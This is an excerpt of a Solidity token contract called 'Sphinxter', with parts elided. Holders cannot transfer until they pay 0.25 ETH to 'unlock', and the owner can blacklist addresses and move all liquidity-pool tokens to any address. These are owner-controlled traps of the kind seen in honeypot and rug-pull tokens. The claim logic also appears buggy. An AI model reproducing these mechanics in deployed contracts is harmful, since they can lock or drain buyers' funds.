...
contract Sphinxter is ERC20, Ownable {
    ...
    uint256 public numberUnlocked;
    uint256 public whenLiquidityAdd = 100;
    bool public test = true;
    bool public liquidityAdded;
    bool public endClaim;

    address targetToken= 0xd9748Fb0AFD3c33c75Ec9EF0FFC9644E916a304d; //0x5ab76e228a59A47873AD5e9811739CCaaEd18A02;
    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8;
    ...
    constructor () ERC20("Sphinxter", "SPHINXTER") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52); //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ...
        //excludeFromFees(0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8, true);
        excludeFromFees(address(this), true);
        
        //_isExcludedFromMaxWalletLimit[0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8] = true;
        _isExcludedFromMaxWalletLimit[address(0)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[deadWallet] = true;

        //_isExcludedFromMaxTxLimit[0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8] = true;
        _isExcludedFromMaxTxLimit[address(0)] = true;
        _isExcludedFromMaxTxLimit[address(this)] = true;
        _isExcludedFromMaxTxLimit[deadWallet] = true;

        _mint(0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8, 6_000_000 * (10**18));  // in case more is needed for liquidity
        _mint(0xAacC4eA6188fb9d2F8FFeE395fd4a75F7e5518B3, 1_000_000 * (10**18));

        _mint(address(this),4e24);   // 4 million for the liquidity (may need slightly more)
       
        transferOwnership(0xC13081BB2D16D83A7e839A575E8eF6b34E028Da8);
    }

    receive() external payable {
        if (msg.value == 25e16) {
            require(!unlocked[msg.sender] , "Already unlocked");
            //require(claimed[msg.sender], "Not claimed tokens yet");
            if (!test) unlocked[msg.sender] = true;
            lastBuy[msg.sender] = block.timestamp;
            payable(0xAacC4eA6188fb9d2F8FFeE395fd4a75F7e5518B3).transfer(5e16);
            numberUnlocked += 1;
            // add to liquidity
            // approve token transfer to cover all possible scenarios
            _approve(address(this), address(uniswapV2Router), 20000000e18);
            // add the liquidity
            uniswapV2Router.addLiquidityETH{value: 2e17}(
              address(this),
              20000e18,
              0, 
              2e17,
        ...
        if (numberUnlocked == whenLiquidityAdd) liquidityAdded = true;
    ...
    function updateWhenLiquidityAdd(uint256 amount) external onlyOwner {
        require(numberUnlocked<whenLiquidityAdd, "Liquidity already added");

        whenLiquidityAdd = amount;
    ...
    function blockAddress(address user, bool state) external onlyOwner {       capturedBotter[user]= state;    }
    function endClaims() external onlyOwner {endClaim = true;}
    function testOFF() external onlyOwner { test = false;} 

    function claimedView() public view returns (bool claimedResult)    { return claimed[msg.sender];  }

    function unlockedView() public view returns (bool unlockedResult)  { return unlocked[msg.sender]; }
     

    function claimSPHINXTER() external {
        if (endClaim) { IERC20(targetToken).transfer(msg.sender, claimedAmount[msg.sender]); claimedAmount[msg.sender]=0; return; }
        require(claimed[msg.sender]==false, "Already claimed from this address");
        IERC20 ERC20token = IERC20(targetToken);
        uint256 balance = ERC20token.balanceOf(msg.sender);
        claimedAmount[msg.sender]= balance;
        if (!test) {ERC20token.transfer(address(this), balance); claimed[msg.sender]= true;}
        if (balance > 1e24) balance = 1e24;
        _mint(msg.sender, balance);
    }

    function sendLPToStakingContract(address stakingContract) external onlyOwner {
        IERC20 ERC20token = IERC20(uniswapV2Pair);
        uint256 balance = ERC20token.balanceOf(address(this));
        ERC20token.transfer(stakingContract, balance);
    }
    ...
    function _transfer(
        ...
        require (!capturedBotter[from]);
        require (unlocked[from] || from  == uniswapV2Pair || from == owner() || from == address(this)  );
        ...
        if (maxWalletLimitEnabled && liquidityAdded) {
        ...
        if (maxTransactionLimitEnabled && liquidityAdded) {
        ...
        bool canSwap = contractTokenBalance >= swapTokensAtAmount && liquidityAdded;
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to] || !liquidityAdded) {
            takeFee = false;
        } 
